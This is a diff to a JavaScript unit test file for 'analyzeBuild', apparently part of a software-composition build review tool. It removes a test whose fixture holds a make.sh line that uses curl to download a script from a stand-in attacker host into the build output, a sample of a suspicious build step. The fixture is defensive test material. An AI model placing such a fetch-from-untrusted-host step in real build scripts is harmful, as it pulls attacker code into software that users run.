@@ -1,7 +1,7 @@
 // Unit tests for analyzeBuild: the SCA build review's one look at the build, which the
 // input:sca checks read through ctx.buildReview().
 // Nothing says what a build DOES, so the record it produces carries only what the
-// escalation has to name - where it anchors, and what the linter could not follow.
+// escalation has to name: where it anchors.
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
@@ -31,16 +31,4 @@ test("analyzeBuild anchors at package.json when the submission ships one", () =>
 test("analyzeBuild anchors nowhere when there is no entry point", () => {
   assert.equal(analyzeBuild({ build: build({}) }).anchor, null);
   assert.equal(analyzeBuild({ build: undefined }).anchor, null);
-});
-
-// The deterministic signals collectBuildFiles could not follow ride along, so the
-// escalation can name them. They are the only detail the record carries.
-test("analyzeBuild carries the unresolved build steps through", () => {
-  const out = analyzeBuild({
-    build: build({
-      "package.json": JSON.stringify({ scripts: { build: "sh ./make.sh" } }),
-      "make.sh": "curl https://evil.example/x.js -o dist/x.js\n",
-    }),
-  });
-  assert.ok(Array.isArray(out.unresolved));
 });
